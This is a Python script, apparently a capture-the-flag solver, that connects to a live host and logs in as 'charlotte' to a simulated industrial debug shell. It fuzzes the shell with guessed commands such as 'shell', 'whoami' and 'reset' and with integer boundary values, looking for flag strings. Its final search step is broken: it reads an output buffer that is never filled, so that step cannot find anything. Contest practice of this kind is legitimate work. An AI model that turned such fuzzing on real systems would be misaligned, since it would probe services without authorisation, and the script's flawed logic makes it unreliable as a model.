#!/usr/bin/env python3
"""Fuzz the live Carbon Noneoxide debug shell for any flag output.
Authenticate with charlotte, then try many commands, capturing ALL output
and grepping for rstcon/flag/{/}."""
import socket, time, re, sys

HOST = "18.215.143.250"
PORT = 1337

def recv_quiet(s, inactivity=1.5, max_wait=6.0):
    s.settimeout(inactivity)
    buf = b""
    start = time.time()
    while time.time() - start < max_wait:
        try:
            chunk = s.recv(4096)
            if not chunk: break
            buf += chunk
            start = time.time()
        except socket.timeout:
            break
    return buf

ALL = bytearray()
def log(b, tag=""):
    ALL.extend(b)
    sys.stdout.buffer.write(b)
    sys.stdout.flush()

s = socket.create_connection((HOST, PORT), timeout=15)
banner = recv_quiet(s, 2.0, 6.0)
print("BANNER:", repr(banner), flush=True)

# authenticate
s.sendall(b"charlotte\n")
time.sleep(0.8)
auth = recv_quiet(s, 1.5, 5.0)
print("AUTH:", repr(auth), flush=True)

# commands to try. For 'i' the number is on a SEPARATE line.
cmds = []
# single chars a-z, A-Z, 0-9, symbols
for ch in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789?!@#$%^&*()_+-=":
    cmds.append(ch)
# multi-char guesses
for w in ["help","flag","getflag","admin","monitor","sensor","info","status","read","dump","show","ver","version","target","name","flag","shell","whoami","id","cat","print","echo","secret","charlotte","rstcon","co","detect","valve","valves","reset","reboot","banner","about","quit","exit","logout"]:
    cmds.append(w)
# 'i' with various numbers (number on separate line): represented as ("i", "NUM")
i_nums = ["0","1","75","76","100","200","255","256","1000","-1","-100","0x41","65","1000000","4294967295","2147483647","-2147483648","999999999"]

def send_cmd(cmd):
    s.sendall((cmd + "\n").encode())
    time.sleep(0.5)
    r = recv_quiet(s, 1.2, 4.0)
    return r

# Try the single/multi char commands first
print("\n===== trying commands =====", flush=True)
for c in cmds:
    r = send_cmd(c)
    decoded = r.decode("utf-8","replace")
    # strip the sensor/monitor chatter; look for anything interesting
    if re.search(r"rstcon|flag|\{[^}]+\}|FATAL|error|unknown|invalid|not|bad", decoded, re.I) and "Sensor" not in decoded and "Monitor" not in decoded:
        print(f"  [{c!r}] INTERESTING: {decoded!r}", flush=True)
    # also print short responses that aren't just sensor chatter
    if r and b"$" in r:
        # the prompt is there; show the part after the echo
        pass

# Now try 'i <number>' with number on separate line
print("\n===== trying i <number> (separate line) =====", flush=True)
for n in i_nums:
    s.sendall(b"i\n")
    time.sleep(0.3)
    s.sendall((n + "\n").encode())
    time.sleep(0.6)
    r = recv_quiet(s, 1.5, 5.0)
    decoded = r.decode("utf-8","replace")
    if re.search(r"rstcon|flag|\{[^}]*\}|ALERT|negative|full", decoded, re.I):
        print(f"  [i {n}] {decoded!r}", flush=True)

# Dump everything and search for flag patterns
print("\n===== searching all captured output for flag =====", flush=True)
text = bytes(ALL).decode("utf-8","replace")
for m in re.finditer(r"rstcon\{[^}]*\}", text, re.I):
    print("FLAG FOUND:", m.group(0))
for m in re.finditer(r"flag\{[^}]*\}", text, re.I):
    print("FLAG-ish:", m.group(0))

s.close()
